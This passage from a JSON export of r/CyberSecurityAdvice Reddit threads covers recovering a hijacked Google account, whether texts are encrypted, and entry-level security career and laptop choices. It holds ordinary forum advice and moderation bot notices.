              ]
            }
          ]
        },
        {
          "id": "o33ffx7",
          "author": "Joy2b",
          "text": "Try forcing the logout.\n\nhttps://help.disneyplus.com/article/disneyplus-log-out-devices",
          "score": 7,
          "created_utc": "2026-02-02 03:36:45",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o33g86s",
          "author": "afnscbrlx",
          "text": "Uninstall all extensions from browser",
          "score": 3,
          "created_utc": "2026-02-02 03:41:32",
          "is_submitter": false,
          "replies": [
            {
              "id": "o33i4m9",
              "author": "saltyachillea",
              "text": "Is the hacker an ex?  I’m not someone in IT but a family member is being stalked this way. You need to remove /revoke other app use/ and a shit load of other stuff too.  Are you on Samsung or iphone, windows computer?  I’m confused as you say your acct was hacked, and “he” continues to access, after changing “his” password, etc.",
              "score": 3,
              "created_utc": "2026-02-02 03:53:06",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o33iqi1",
          "author": "saltyachillea",
          "text": "Everything here is not good enough if this is someone that has access to devices (ie old) that you used.  What devices are linked to all of these accounts. Please give more specific details.",
          "score": 3,
          "created_utc": "2026-02-02 03:56:53",
          "is_submitter": false,
          "replies": [
            {
              "id": "o33jj48",
              "author": "saltyachillea",
              "text": "OR access to other account passwords. Ie Edge, Microsoft, Samsung, Chrome, etc etc. Install new password agent  on a new browser unrelated. Do not do it through edge, windows in my opinion.  New password agent like bitwarden etc. Set it up now, make new passwords hard, like very and in the notes section put what you did (ie changed disney via  (how) and when/keep track of what you are doing.  You need to reset windows hello  or for all devices if this is being done possibly on an old computer.  You need to ensure each and every thing (I mean everything….) 3rd party access is revoked. Meaning can’t sign in to something through another app that’s approved. This is if this is an ex/stalker type person…there are lots of other things you should do as well but will wait till I get more info",
              "score": 3,
              "created_utc": "2026-02-02 04:01:51",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o33j6e2",
              "author": "Due_Builder9420",
              "text": "Tenho um notebook, mas estou formatando ele nesse exato momento. Antes desconectei as contas Google (todos os dispositivos)  através do meu celular.",
              "score": 0,
              "created_utc": "2026-02-02 03:59:36",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o35ofcf",
                  "author": "saltyachillea",
                  "text": "If you are using Samsung, you need to ensure your samsung account does not list google account for sign in, etc. Also, ensure that if the notebook is windows…that devices on your account are removed, and phone link not active.",
                  "score": 2,
                  "created_utc": "2026-02-02 14:10:37",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o34rrso",
          "author": "Randomness_2828",
          "text": "Can your Roblox and Disney account can change email address? If can create new account and replace the newly created email address. Make sure your password at least 15 characters with 4 types of different characters with no common English spelling word",
          "score": 3,
          "created_utc": "2026-02-02 10:15:04",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o383nlg",
          "author": "Numerous_Hat7446",
          "text": "They did  a passkey of your account to their device\nDelete all passkeys",
          "score": 1,
          "created_utc": "2026-02-02 21:01:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o38llnr",
              "author": "Due_Builder9420",
              "text": "I did that and created my own, is that a problem?",
              "score": 1,
              "created_utc": "2026-02-02 22:27:59",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o38pe34",
                  "author": "Numerous_Hat7446",
                  "text": "I am sure",
                  "score": 2,
                  "created_utc": "2026-02-02 22:47:04",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o39pf27",
          "author": "[deleted]",
          "text": "[removed]",
          "score": 1,
          "created_utc": "2026-02-03 02:05:58",
          "is_submitter": false,
          "replies": [
            {
              "id": "o39pfos",
              "author": "AutoModerator",
              "text": "Hello,\n\nYour comment was automatically removed because your Reddit account has significantly negative comment karma. We use this threshold to reduce disruptive behavior and maintain quality discussion in r/cybersecurity.\n\nIf you believe this was a mistake or would like to appeal, feel free to message the mod team.\n\nThank you.\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/CyberSecurityAdvice) if you have any questions or concerns.*",
              "score": 1,
              "created_utc": "2026-02-03 02:06:04",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o3a30h4",
          "author": "SecTechPlus",
          "text": "After all the usual things of resetting password, changing/enabling 2FA, and forcing logouts, you need to:\n\n1. go into  Google Account Settings > Security & Sign-on > 2-Step Verification > scroll to bottom for the \"App passwords\" section and delete anything that is there, even if you know what's it's for (if you still need an app password, you can recreate it)\n2. Go into Gmail settings > all settings\n   1. in the Accounts section look for \"Grant access to your account\" and delete anything that's there\n   2. in the Forwarding section delete everything that's there, and ensure POP/IMAP access is disabled\n   3. in the Filters and Block Addresses section look for any filters that forward messages to another email address and delete them all\n3. Go back and force logout of all sessions (even your own session if you can) and log back in with 2FA\n\nThis should lock down your Google account better, and beyond this if they still have access then it might be because of computer malware on the same computer/device you use to access your email.",
          "score": 1,
          "created_utc": "2026-02-03 03:24:24",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3d4qk4",
          "author": "23Scout",
          "text": "is the hacker your parent?",
          "score": 1,
          "created_utc": "2026-02-03 16:22:06",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qui6j0",
      "title": "Is it a bad idea to work a temporary summer job while building up my skills?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qui6j0/is_it_a_bad_idea_to_work_a_temporary_summer_job/",
      "author": "Unlucky_Window_5413",
      "created_utc": "2026-02-03 04:24:17",
      "score": 6,
      "num_comments": 4,
      "upvote_ratio": 1.0,
      "text": "Hey guys. I am a soon to be graduating senior in Cybersecurity from Penn State. I am focusing on IT Help desk/networking roles. While I am still actively applying to jobs. I had an internship at a big company but the team I worked for is downsizing which led to me being let go :/ I haven’t heard anything back from any of the companies I applied to and I want to make a plan B just in case if I don’t land a full time position for right after college. \n\nWhile the main goal is to land a job. Do you think it is a bad idea to work a temporary summer job and then use that money to fund different personal projects and gain different certifications (currently have security plus) thinking of getting network plus and maybe looking into different hackthebox and tryhackme certs for technicals along with building up my current homelab for more technical experience with firewalls, dynamic DNS, SIEM systems and etc? I was also thinking about attending different cyber conferences aswell to help with connections.\n\nDo you think that this is a bad idea? I want to get some feedback on what others have done in the past. ",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qui6j0/is_it_a_bad_idea_to_work_a_temporary_summer_job/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o3acfeo",
          "author": "AutoModerator",
          "text": "Hello,\n\nYour submission was automatically removed because your Reddit account does not meet our minimum karma or account age requirements. These measures help maintain the quality of posts on r/cybersecurity and prevent spam.\n\nRequirements:\n- Minimum of 20 comment karma OR 20 link karma\n- Account age of at least 10 days\n- Combined karma of at least 40\n\nTo build your karma, participate in discussions across Reddit and contribute thoughtful content in subreddits that welcome new users.\n\nIf you believe this was a mistake or have any questions, please message the mod team.\n\nThank you.\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/CyberSecurityAdvice) if you have any questions or concerns.*",
          "score": 1,
          "created_utc": "2026-02-03 04:24:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3bn0zl",
          "author": "Medium-Potential-348",
          "text": "It’s never bad to work to keep yourself afloat while going for your goals and it won’t hinder anything unless you let it. Go for it.\n\nAlso, Cyber conferences are a great idea, but also don’t kill your pockets. Also, make sure you’re building up your LinkedIn, while doing this.",
          "score": 1,
          "created_utc": "2026-02-03 11:09:53",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3byvgb",
          "author": "Nessuwu",
          "text": "It's never a bad idea to look for jobs. Worst case scenario even if you don't land one, you may save yourself a couple months worth of effort spent revising your resume. It took 6 months of constant revision before I finally landed a help desk role (which I was let go of from a week later lol). But at least now my resume is in much better shape.",
          "score": 1,
          "created_utc": "2026-02-03 12:40:50",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3pkab9",
          "author": "Winkaholic",
          "text": "Not at all, it can actually be a smart move. A temporary job gives you income and breathing room to invest in certifications, homelab projects, and networking opportunities like conferences. Employers generally respect initiative, and showing ongoing skill development alongside a summer job can strengthen your resume rather than hurt it.",
          "score": 1,
          "created_utc": "2026-02-05 13:02:40",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qrsldu",
      "title": "How do I know if a text is secure?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qrsldu/how_do_i_know_if_a_text_is_secure/",
      "author": "myaltmusicalt",
      "created_utc": "2026-01-31 04:32:02",
      "score": 5,
      "num_comments": 10,
      "upvote_ratio": 0.78,
      "text": "I'm a trustee on some people's 401k. 2 people just switched to some financial advising firm who seems very lax about securing information. At one point they asked me to text them a photo of my license to which I politely declined. I'm not sure how bothered I'd have been normally, but this is a large financial group who should have the most stringent standards for protecting information and preventing identity theft. I gave them a short reply about it, to which he said \"I should have mentioned this is a secured text.\"\n\nCan that be true? Can I be sending and receiving special secured texts without any form of encryption on my end or any knowledge that it's even happening?",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qrsldu/how_do_i_know_if_a_text_is_secure/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o2qslld",
          "author": "SecTechPlus",
          "text": "SMS is not encrypted, but RCS (Rich Communication Services) as an SMS replacement is encrypted. So you'd need to make sure your phone is communicating that that particular phone number using RCS (both ends need to support it for it to work) \n\nThat said, this is encryption only for the information in transit. The picture would still exist on their phone as a regular picture. This is about the same as many other encrypted communications, like TLS/HTTPS as it only protects information in transit.  This might be ok, as everyone has different risk tolerances, but hopefully this information helps you make your own decision.",
          "score": 2,
          "created_utc": "2026-01-31 05:39:19",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2t1xpc",
              "author": "myaltmusicalt",
              "text": "Well TIL. I've been using the default android messages app which is SMS, but today I switched to Google messages which supports RCS (and also will let me react to people's texts with emojis).",
              "score": 2,
              "created_utc": "2026-01-31 15:56:32",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o352b0q",
                  "author": "midwesternbuttesects",
                  "text": "It’s still not secure for business. \n\nMy firm has two ways of exchanging files securely: clients upload to sharepoint or they use our secure file transfer tool.  \n\nIf they want to just email me that’s cool too, but we encourage the secure solutions.  \n\nMy bank had a portal to upload documents to them for a mortgage.  Any emails back and forth they move onto their secure email platform.  \n\nIf you do text them a photo of your license. I would text them a link with expiration date.",
                  "score": 1,
                  "created_utc": "2026-02-02 11:48:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2s1j9o",
          "author": "clusterofwasps",
          "text": "If they seem lax overall, and on top of that don’t have a secure method of storing your ID (as the other commenter mentioned, RCS encrypts in transit but the other party’s phone storage does not guarantee safety) … I’d say you’re definitely in your rights to ask what digital security protocols are in place.\n\nYou’re a trustee on multiple people’s 401ks and two different folks are using a service asking for photo ID over text? I may be a little confused at the context but that’s maybe more a personal curiosity than pertinent to the security part of things.",
          "score": 1,
          "created_utc": "2026-01-31 12:23:39",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2sl9vl",
              "author": "myaltmusicalt",
              "text": "Oh, 2 people switched to the same firm together",
              "score": 1,
              "created_utc": "2026-01-31 14:30:29",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o2soain",
          "author": "ericbythebay",
          "text": "Legit financial providers don’t use insecure SMS for PII.",
          "score": 1,
          "created_utc": "2026-01-31 14:47:20",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2toa6o",
          "author": "noxiouskarn",
          "text": "My lawyer and bank use secure portals. I log into a page and upload through it. we do not rely on sms",
          "score": 1,
          "created_utc": "2026-01-31 17:44:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2ubr91",
              "author": "myaltmusicalt",
              "text": "That's what my accountant does. It can be a pain sometimes, but I kn9w they're taking things seriously",
              "score": 1,
              "created_utc": "2026-01-31 19:34:45",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o34000y",
          "author": "goatsinhats",
          "text": "The text can be encrypted with Quatnum resistant cryptography, the question is where is that photo end up, how do you verify it got to the right person, how will they handle the information when they get it?\n\nSomeone intercepting your text is the least of the concerns here. \n\nAlso keep in mind a lot of large firms have independent advisors who work for them and that in itself doesn’t denote security. \n\nUpload your ID to the parent companies site and no where else if your worried (have a right to be so).",
          "score": 1,
          "created_utc": "2026-02-02 05:58:52",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qu5vcn",
      "title": "System Administrator vs Network Administrator for Cyber Security goals",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qu5vcn/system_administrator_vs_network_administrator_for/",
      "author": "stephnot",
      "created_utc": "2026-02-02 20:01:19",
      "score": 5,
      "num_comments": 10,
      "upvote_ratio": 0.73,
      "text": "Hello, I am pretty new in IT and have been a system admin for around a month. I have been vouched to join the network admin team (Due to the certifications I have) since they lost a member but it’s fully my choice on if I go or not.\n\nLong term I plan to move into a cyber security role. I don’t want to miss a great opportunity to join the Network team but I also don’t want to miss the opportunity to build my experience as a system admin.\n\nWhich role would put me in a better position to make more money and increase likely hood of scoring a cyber security role interview. I am quite young so don’t have a ton of work experience so not quite sure exactly what role I want to shoot for but Cyber security engineer interests me or SOC analyst as a more medium term goal.\n\nI’m just worried about committing to something and making my goals harder to achieve.",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qu5vcn/system_administrator_vs_network_administrator_for/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o39jrue",
          "author": "Big-Minimum6368",
          "text": "People look at things like it's one or the other. In my 20 years of experience I will always take the job that is offered, but continue on with other interests. \n\nSysadmin and Network Engineer share a lot of commonality and you should sharpen your fundamentals to understand both as well as the rest of the technical landscape. Either way it makes you more powerful in both areas. \n\nDon't focus, diversify",
          "score": 4,
          "created_utc": "2026-02-03 01:33:56",
          "is_submitter": false,
          "replies": [
            {
              "id": "o39mgzc",
              "author": "stephnot",
              "text": "thank you, yeah that makes sense. I just have not been working as sys admin for very long so if this role has a wider amount of things for me to learn than net would want to stick with it for a little longer",
              "score": 1,
              "created_utc": "2026-02-03 01:49:23",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o3bqey8",
                  "author": "Big-Minimum6368",
                  "text": "If you take a step back and look at a high level you will see the similarities. At the same time you can zoom in really deep on a specific topic and find that there is a lot more to it than you think.\n\n Trust me if your technical enough at this stage to be curious about your path, you won't get bored.",
                  "score": 1,
                  "created_utc": "2026-02-03 11:38:31",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o37y2ir",
          "author": "JustAnEngineer2025",
          "text": "It's a coin toss as both are valuable skills and critical cybersecurity functionality occurs under both areas.\n\nDespite what some people think, you do not have to be a card-carrying member of a cybersecurity team to do cybersecurity work.",
          "score": 1,
          "created_utc": "2026-02-02 20:35:40",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o38wl5q",
          "author": "EirikAshe",
          "text": "I’d recommend going the network admin route.",
          "score": 1,
          "created_utc": "2026-02-02 23:25:18",
          "is_submitter": false,
          "replies": [
            {
              "id": "o39m3zc",
              "author": "stephnot",
              "text": "any reason?",
              "score": 1,
              "created_utc": "2026-02-03 01:47:21",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o39t6qn",
                  "author": "EirikAshe",
                  "text": "It’s a domain of knowledge you’ll need to be well-versed in.. and typically will also give you exposure to sysad stuff as well. The inverse is unlikely on as deep of a level. A lot depends on the company you work for though",
                  "score": 1,
                  "created_utc": "2026-02-03 02:27:18",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o3ae0ms",
          "author": "Better-Club6429",
          "text": "Going network first is key. If you have the certifications then you should understand system admin stuff easily while working in network. I hired a cybersecurity person for a role i had opened and he was more networking then system admin. He understood both though. Just because you can't touch 1 does not mean you don't qualify for the role.",
          "score": 1,
          "created_utc": "2026-02-03 04:35:09",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3g813q",
          "author": "Apprehensive_Book145",
          "text": "Sys admin can be deeper if your running domain controllers and not just adding users to Entra. \n\nNetwork admin is more fun but its hammered by AI.",
          "score": 1,
          "created_utc": "2026-02-04 01:22:21",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3qqll6",
          "author": "Logical-Gene-6741",
          "text": "Actual sys admin actually looks into infections. Network admin does not.",
          "score": 1,
          "created_utc": "2026-02-05 16:39:44",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qucm5w",
      "title": "What should I expect from my first interview?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qucm5w/what_should_i_expect_from_my_first_interview/",
      "author": "LVKOZY",
      "created_utc": "2026-02-03 00:16:42",
      "score": 5,
      "num_comments": 15,
      "upvote_ratio": 1.0,
      "text": "I have an interview scheduled for tomorrow for a Tier 1 IT Support Desk position—this will be my first interview in the IT field. I’m currently enrolled in school for cybersecurity, and outside of that I’ve spent the last 7+ years working hands-on with PCs, troubleshooting hardware/software issues, and doing a lot of problem-solving with gaming consoles and general tech.\n\nI’m not going in completely blind, but since this is my first formal IT interview, I’m looking to get a general idea of what I should expect from the recruiter. I know every company is different, but any insight into the types of questions, technical topics, or soft skills they may focus on would be greatly appreciated.\n\nThanks in advance!",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qucm5w/what_should_i_expect_from_my_first_interview/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o399pm7",
          "author": "Panic2211",
          "text": "Make sure you know how to troubleshoot connectivity and printer issues",
          "score": 3,
          "created_utc": "2026-02-03 00:37:07",
          "is_submitter": false,
          "replies": [
            {
              "id": "o399v1q",
              "author": "LVKOZY",
              "text": "Pretty easy, I do it all the time for gaming, printers seem about the same too lol",
              "score": 1,
              "created_utc": "2026-02-03 00:37:56",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o399a92",
          "author": "yoongely",
          "text": "in my tier 1 it support desk interview i was asked what i would do if the ceo walked in on me eating a banana. i give up man",
          "score": 2,
          "created_utc": "2026-02-03 00:34:47",
          "is_submitter": false,
          "replies": [
            {
              "id": "o399dth",
              "author": "LVKOZY",
              "text": "The only right answer is make eye contact and go all the way down right?…",
              "score": 1,
              "created_utc": "2026-02-03 00:35:19",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o39cmc9",
                  "author": "yoongely",
                  "text": "yeah shove it all the way in ur mouth and swallow in one gulp",
                  "score": 1,
                  "created_utc": "2026-02-03 00:53:03",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o396kwc",
          "author": "SavannahPharaoh",
          "text": "They’ll likely give you various scenarios and ask how you’d troubleshoot them.",
          "score": 1,
          "created_utc": "2026-02-03 00:20:05",
          "is_submitter": false,
          "replies": [
            {
              "id": "o399hoz",
              "author": "LVKOZY",
              "text": "Interesting, hopefully they aren’t expecting something too in depth that’s way out of my area if knowledge",
              "score": 1,
              "created_utc": "2026-02-03 00:35:55",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o39ac51",
                  "author": "SavannahPharaoh",
                  "text": "Nah not for a T1. It’ll be more like your thought process. For example, a user calls in saying they can’t print. Where do you start, and what are your next steps if that doesn’t work?",
                  "score": 1,
                  "created_utc": "2026-02-03 00:40:30",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o3df6ua",
          "author": "SavannahPharaoh",
          "text": "The last part about what they like about working there is something the recruiter won’t know.",
          "score": 1,
          "created_utc": "2026-02-03 17:10:32",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qswluc",
      "title": "Asking for advice & resources!",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qswluc/asking_for_advice_resources/",
      "author": "Overall-Instance-288",
      "created_utc": "2026-02-01 11:57:54",
      "score": 5,
      "num_comments": 3,
      "upvote_ratio": 1.0,
      "text": "Hello everyone,I hope you are doing well.\nI study cyber security but I have a major problem,i'm the kind of person who needs to understand every little detail in order to understand a concept. And my biggest problem is that I don't know what amount of hardware knowledge I should have,I feel like I have to learn everything but everything never ends and I feel stuck while hardware ain't even my speciality but how can u protect something and u don't even know how it fully functions?\nI'd be greatful if you can provide me with resources and help me know what amount is knowledge is enough for me and where should I start and stop?\nAnd generally,what do you think is the sufficient enough knowledge about hardware any tech person must have?",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qswluc/asking_for_advice_resources/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o2ygqh3",
          "author": "AutoModerator",
          "text": "Hello,\n\nYour submission was automatically removed because your Reddit account does not meet our minimum karma or account age requirements. These measures help maintain the quality of posts on r/cybersecurity and prevent spam.\n\nRequirements:\n- Minimum of 20 comment karma OR 20 link karma\n- Account age of at least 10 days\n- Combined karma of at least 40\n\nTo build your karma, participate in discussions across Reddit and contribute thoughtful content in subreddits that welcome new users.\n\nIf you believe this was a mistake or have any questions, please message the mod team.\n\nThank you.\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/CyberSecurityAdvice) if you have any questions or concerns.*",
          "score": 1,
          "created_utc": "2026-02-01 11:57:55",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3bwt6m",
          "author": "eric16lee",
          "text": "Keep in mind that the cybersecurity field is a mile wide. Concepts take years to learn. \n\nMy advice is when you have a specific question, use AI to explain it in a way you can easily understand. \nYou don't need to be a hardware expert to be good in cybersecurity. \n\nWhat specific area of cyber interests you?  Let's focus on that. \nThink of the saying: how do you eat an elephant?  One bite at a time.",
          "score": 1,
          "created_utc": "2026-02-03 12:26:36",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3iv555",
          "author": "dennisthetennis404",
          "text": "You don't need to know everything about hardware to be effective in cybersecurity, really! Learn as you go!",
          "score": 1,
          "created_utc": "2026-02-04 13:08:13",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qwdrr6",
      "title": "Torn between upgrading to either a MacBook Pro M4 or M5, or a Windows Laptop with either an equivalent Snapdragon, AMD or Intel chip?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qwdrr6/torn_between_upgrading_to_either_a_macbook_pro_m4/",
      "author": "Al_Muhareb2401",
      "created_utc": "2026-02-05 06:24:08",
      "score": 5,
      "num_comments": 12,
      "upvote_ratio": 1.0,
      "text": "I've been using Gaming laptops for over 5 years now and as a student in Univeristy its very difficult to carry around due to the weight of both the laptop and the charger, its very slow even with the charger constantly plugged in and without it its practically a potato, it has a very tiny battery life barely lasting under an hour, it tends to overheat as well. Clearly I would wnat to upgrade.\n\nFor context I am doing a degree Majoring in Cybersecurity and Criminology.   \n  \nI've always leaned towards a Macbook with either an M4 or M5 chip for performance, lightweight, UI, etc. but since theres a common problem with running Cybersecurity tools I've always gone for Windows.\n\nHowever, now I am thinking of building a NAS Home Server (for many different reasons), which would might be able to host and run thigns that are incompatiable with Mac such as VMs as well as Cybersecurity Tools. But as I spoke to a salesman about upgrading to a Mac Pro with either an M4 or M5 Chip, he told me that going with a Windows laptop with either a Snapdragon or AMD chip would be a better choice (It might also make using Cyberseurity tools easier to use since I'm not 100% sure how exactly I would be able to access it from the NAS and if its practical enough to benefit from).\n\n  \nSo now im torn between going for a Macbook Pro with an M4 or M5 chip then running tools and programs incompatiable with MacOS on the NAS\n\nOR\n\nUpgrading to a Windows Snapdragon or AMD equivalent. I will be setting up an NAS eitherway.",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qwdrr6/torn_between_upgrading_to_either_a_macbook_pro_m4/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o3oesl5",
          "author": "Honest_Park_1126",
          "text": "Same doubt fellow security enthusiast,  i don't want to lose the freedom and versatility of windows but at the same time would love the reliability, efficiency of mac lol😅",
          "score": 1,
          "created_utc": "2026-02-05 07:03:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3olkrb",
          "author": "Better-Problem-8716",
          "text": "I run both windows and linux on my mac in vms, i havent had any issues. Snapdragon cpus arent compatible with some software ... mostly games, so careful about that. I dont own one to confirm, just what a sales rep told me .",
          "score": 1,
          "created_utc": "2026-02-05 08:05:35",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3p03dr",
          "author": "Severe_Stranger_5050",
          "text": "Get the mac  \nVirtualize whatever you might need from windows and Linux",
          "score": 1,
          "created_utc": "2026-02-05 10:25:13",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3p5w86",
              "author": "Al_Muhareb2401",
              "text": "Would there be any limits by trying to run either a Windows or Linux VM such as cybersecurity tools and programs that wont work or anything like that?\n\nand does the M4 or M5 chip make a difference?",
              "score": 1,
              "created_utc": "2026-02-05 11:17:18",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o3p70xs",
                  "author": "Severe_Stranger_5050",
                  "text": "M5 chips are faster in every single way.\n\nBut No there isn't any real limits.   \nI hardly ever touch windows on my mac  \n  \nOn the daily, which is mostly just writing up reports, data analysis, preparing training and other boring GCR-bullshit, my mac is the perfect machine.  \nSilent, fast and long-lived.   \n  \nAnd for pentesting or forensics i just use virtualbox images of Kali Linux.  \nNot only does it make my system seperated from potential harmful software, it also makes it easier to do documentation, because 1 VM-image is only used for 1 assignment. \n\nIt's basically the hanna montana of setups.  \n\"She's got the beeeeeest of both worlds \"",
                  "score": 1,
                  "created_utc": "2026-02-05 11:26:57",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o3pamm7",
          "author": "NotANetgearN150",
          "text": "I have an M1 Air 8GB model I still use and it’s running great.  I was extremely surprised how well Windows ARM on parallel desktops is able to just run x64 stuff without any tinkering at all.\n\nA Windows laptop no matter what specs or care that goes into it, I have to cross my fingers and hope it ages well.  A MacBook you know for fact WILL last.",
          "score": 1,
          "created_utc": "2026-02-05 11:55:49",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3pcnqv",
              "author": "Al_Muhareb2401",
              "text": "Yea thats the reason why I was leaning towards getting a Mac since the experience isnt like any other laptop. The only restraint I really have is the compatiability aspect with running Cybersecurity tools and otherwise.",
              "score": 1,
              "created_utc": "2026-02-05 12:11:03",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o3pd2jt",
                  "author": "NotANetgearN150",
                  "text": "What do you plan on running specifically?  I’d be hard pressed to believe there wouldn’t be a macOS equivalent native/ported tool or that you couldn’t run it on Windows/Linux ARM.",
                  "score": 1,
                  "created_utc": "2026-02-05 12:14:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        }
      ]
    },
    {
      "id": "1qufkas",
      "title": "2 years of cyber internships + Sec+/Net+/CySA+ - Job market outlook?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qufkas/2_years_of_cyber_internships_secnetcysa_job/",
      "author": "Direct-Second-4995",
      "created_utc": "2026-02-03 02:23:23",
      "score": 4,
      "num_comments": 3,
      "upvote_ratio": 1.0,
      "text": "I’m graduating soon with a degree in Cybersecurity and currently working in a long-term cybersecurity internship (\\~1 year), with a previous year-long cyber internship before that. The current role is SecOps-focused (alert triage, endpoint/email security, vulnerability scanning, ServiceNow workflows), and the other focused on vulnerability management, security tooling, and exposure to compliance frameworks (HIPAA, NIST, CIS).\n\nI also hold Security+, Network+, CySA+ and Splunk core certified user\n\nBest case scenario I convert to full-time where I’m currently working, but if that doesn’t happen in the next few months, I’m trying to get a realistic sense of how competitive this background is in the current market for entry-level cybersecurity roles? I’m in the US",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qufkas/2_years_of_cyber_internships_secnetcysa_job/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o39uaka",
          "author": "SavannahPharaoh",
          "text": "You have what I would consider all the basics for an entry-level position.",
          "score": 1,
          "created_utc": "2026-02-03 02:33:40",
          "is_submitter": false,
          "replies": [
            {
              "id": "o39vjjt",
              "author": "robocop_py",
              "text": "Unfortunately the days of entry-level cybersecurity are coming to an end.",
              "score": 0,
              "created_utc": "2026-02-03 02:40:48",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o39x46i",
          "author": "Plenty-Pay1769",
          "text": "Following.",
          "score": 1,
          "created_utc": "2026-02-03 02:49:45",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qt3655",
      "title": "CCIE to IT Sec",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qt3655/ccie_to_it_sec/",
      "author": "Big_Wet_Beefy_Boy",
      "created_utc": "2026-02-01 16:34:55",
      "score": 3,
      "num_comments": 11,
      "upvote_ratio": 0.67,
